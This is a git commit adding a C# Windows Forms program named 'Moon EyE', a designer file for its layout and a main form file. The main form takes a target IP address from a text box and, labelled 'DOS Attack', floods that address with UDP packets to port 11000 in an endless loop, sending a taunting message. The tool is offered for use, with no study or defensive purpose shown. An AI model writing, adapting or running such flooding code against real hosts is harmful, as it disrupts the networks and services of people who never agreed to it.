da1e1e7f193eea89109af5c49ab61b4a7738a1be
0ark-B <101301494+0ark-B@users.noreply.github.com>
2022-03-10 02:04:38 +0100

    Add files via upload

---
+++ Form1.Designer.cs
@@ -0,0 +1,123 @@
+﻿
+namespace MoonEyE
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.targetTb = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // targetTb
+            // 
+            this.targetTb.Font = new System.Drawing.Font("Microsoft Sans Serif", 48F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.targetTb.Location = new System.Drawing.Point(409, 202);
+            this.targetTb.Name = "targetTb";
+            this.targetTb.Size = new System.Drawing.Size(611, 80);
+            this.targetTb.TabIndex = 0;
+            this.targetTb.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
+            this.targetTb.TextChanged += new System.EventHandler(this.targetTb_TextChanged);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 27.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.label1.Location = new System.Drawing.Point(174, 427);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(126, 42);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "AUTO";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Font = new System.Drawing.Font("Microsoft Sans Serif", 27.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.label2.Location = new System.Drawing.Point(657, 427);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(126, 42);
+            this.label2.TabIndex = 2;
+            this.label2.Text = "AUTO";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 27.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
+            this.label3.Location = new System.Drawing.Point(1098, 427);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(126, 42);
+            this.label3.TabIndex = 3;
+            this.label3.Text = "AUTO";
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = global::MoonEyE.Properties.Resources.sumbit;
+            this.pictureBox1.Location = new System.Drawing.Point(545, 595);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(382, 145);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize;
+            this.pictureBox1.TabIndex = 4;
+            this.pictureBox1.TabStop = false;
+            this.pictureBox1.Click += new System.EventHandler(this.pictureBox1_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackgroundImage = global::MoonEyE.Properties.Resources.MoonEyEBackGround2;
+            this.ClientSize = new System.Drawing.Size(1413, 789);
+            this.Controls.Add(this.pictureBox1);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.targetTb);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form1";
+            this.Text = "Moon EyE";
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox targetTb;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.PictureBox pictureBox1;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,81 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Net.Sockets;
+using System.Net;
+
+namespace MoonEyE
+{
+    
+    public partial class Form1 : Form
+    {
+        
+
+
+
+        public Form1()
+        {
+            InitializeComponent();
+            
+            
+        }
+
+        private void targetTb_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        public void pictureBox1_Click(object sender, EventArgs e)
+        {
+
+            string ipTarget = targetTb.Text;
+            MessageBox.Show("Loading data...", "DOS Attack", MessageBoxButtons.OKCancel, MessageBoxIcon.Information ) ;
+            
+            IPAddress ip;
+            string ip2 = ipTarget;
+            bool ValidateIP = IPAddress.TryParse(ip2, out ip);
+            if (ValidateIP)
+            {
+
+                MessageBox.Show("IP is valide", "Correct", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                MessageBox.Show("Durring attack, to stop close a window!", "DOS Attack", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+
+                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+                IPAddress serverAddr = IPAddress.Parse(ipTarget);
+                IPEndPoint endPoint = new IPEndPoint(serverAddr, 11000);
+                string text = "Dark-B Says Hi <3 How is your ping i think is good, the person who DOS you is maybe near, have a good day bye!";
+                byte[] send_buffer = Encoding.ASCII.GetBytes(text);
+
+
+                while (true)
+                {
+                    sock.SendTo(send_buffer, endPoint);
+                }
+            }
+
+
+
+
+            else
+            {
+                MessageBox.Show("IP is invalide", "Failure", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                targetTb.Text = "";
+            }
+
+
+
+
+
+            
+
+        }
+        
+    }
+}
